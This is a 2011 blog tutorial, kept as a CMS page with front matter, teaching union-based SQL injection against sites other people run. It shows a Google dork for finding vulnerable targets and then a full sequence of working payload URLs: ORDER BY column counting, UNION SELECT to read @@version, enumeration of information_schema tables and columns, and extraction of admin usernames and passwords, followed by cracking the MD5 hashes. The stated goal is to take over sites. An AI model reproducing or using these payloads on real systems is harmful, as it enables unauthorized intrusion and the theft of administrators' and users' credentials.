---
# http://learn.getgrav.org/content/headers
title: Tutorial: sql injection
slug: tutorial-sql-injection
# menu: Tutorial: sql injection
date: 17-01-2011
published: true
publish_date: 17-01-2011
# unpublish_date: 17-01-2011
# template: false
# theme: false
visible: true
summary:
    enabled: true
    format: short
    size: 128

taxonomy:
    category:
        - Blog
    tag:
        - database
        - exploit
        - hack
        - hacking
        - internet
        - passwords
        - sql
        - website
    author:
        - 'Shashank Agarwal'
    migration-status: review
    category: [database,exploit,hack,hacking,internet,passwords,sql,website]
    tag: []
author: 'Shashank Agarwal'
metadata:
    author: 'Shashank Agarwal'
#      description: Your page description goes here
#      keywords: HTML, CSS, XML, JavaScript
#      robots: noindex, nofollow
#      og:
#          title: The Rock
#          type: video.movie
#          url: http://www.imdb.com/title/tt0117500/
#          image: http://ia.media-imdb.com/images/rock.jpg
#  cache_enable: false
#  last_modified: true

---

[![](http://4.bp.blogspot.com/_V2JZuLkPrjQ/TTR4IWoJmBI/AAAAAAAAI5A/hb8X5Yi_5as/s200/SQL-Injection-Attack.jpg)](http://4.bp.blogspot.com/_V2JZuLkPrjQ/TTR4IWoJmBI/AAAAAAAAI5A/hb8X5Yi_5as/s1600/SQL-Injection-Attack.jpg)

Sql Injection tutorial advanced. So far in all the hacks the most used by h4ck3rs from n00b to an 1337 one has been the SQL injection attack. Here we at hackiteasy we present a tutorial on how to apply SQL injection to websites. This trick has been found to be working on a huge no. of sites.

The hack starts as follows.

**Finding vulnerable site**

To find a vunerable site open google

Type in a dork like “inurl:index.php?id=” (without quotes) there are many other similar formats for finding such vulnerable pages.

Now click on any site like http://www.yoursite.com/index.php?id=786

Now to test if the siote is hackable or not add a ‘ at the end of the site.

If the site gives an error like

“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”84′ at line 1″

we can assume that it is vunerable. If not try some other site.

We have the vulnerable site now. So lets try with different sql injection queries.

**Checking the number of columns:**

 To check the number of columns we do the following

http://www.site.com/index.php?id=-786 order by 1– if the page loads normally without any error we proceed below  
http://www.site.com/index.php?id=-786 order by 2– (no error)  
similarly check  
http://www.site.com/index.php?id=-786 order by 3–  
http://www.site.com/index.php?id=-786 order by 4–  
http://www.site.com/index.php?id=-786 order by 5–  
http://www.site.com/index.php?id=-786 order by 6– =>error

if we get an error at the 6 like “unknown column” that means there exists only 5 columns.

**Finding vunerable columns:**

To find the vunerable columns we add union all select 1,2,3,4,5– after http://www.site.com/index.php?id=-786

Now the url becomes

http://www.site.com/index.php?id=-786 union all select 1,2,3,4,5–

after hitting enter we if we see some numbers like 2 4 some where on the page.Then the columns 2 and 4 are vunerable and data can be retrieved from colums 2 and 4. This is important as we would see data on these columns only.

**Finding Mysql version:**

To find the sql version we replace 2 or 4 (or the bulnerable column in yor case) with @@version.

The URL would become-

http://www.site.com/index.php?id=-786 union all select 1,@@version,3,4,5–

After hitting enter the sql version appears on the page in the vulnerable column space

Lets assume we got 5.0.90-community-log on page which is sql version.

**Getting Table names:**

To get table names replace @@version in the url with table\_name and add from information\_schema.tables– to the end.

The url now becomes

http://www.site.com/index.php?id=-786 union all select 1,table\_name,3,4,5 from information\_schema.tables–

After hitting enter the page shows the tablenames.

Lets us assume we got something like this

comment,log,admin,news,news\_comment,members.

To take over the site we data should be retrieved from admin table.As it seems the most favorable to contain all the passwords.

**Getting the column names:**

To get the column names from the table “admin” we do the following

http://www.site.com/index.php?id=-786 union all select 1,column\_name,3,4,5 from information\_schema.columns where table\_name=char(ascii of tablename)–

**Converting the tablename to ascii:**  
** **  
For the real hack above first we have to convert the admin table to ascii values. Convert the tablename to ascii here

http://www.getyourwebsitehere.com/jswb/t…ascii.html

The ascii generated for the table name admin is & #97;&# 100;&# 109;&# 105;&# 110;

Now remove &# and add a , between them

So now it is 97,100,109,105,110

Replace it in the place of ascii of the tablename

Now it becomes

http://www.site.com/index.php?id=-786 union all select 1,column\_name,3,4,5 from information\_schema.columns where table\_name=char(97,100,109,105,110)–

You can now see something like

username pwd gender email on page

**Getting username and password:**

To get the username and password we use

http://www.site.com/index.php?id=-786 union all select 1,concat(username,0x3a,pwd),3,4,5 from admin–   and hit enter.

At this point we see username and password on page.

The password may be in MD5 encrypted form, this can easilt be decrypted using the following converter-

http://www.md5decrypter.co.uk

This was a nice SQL injection hack tutorial. Please comment if you like the post.

Regards [hackiteasy.com](http://hackiteasy.com/)

Go to our new site- shankee.com
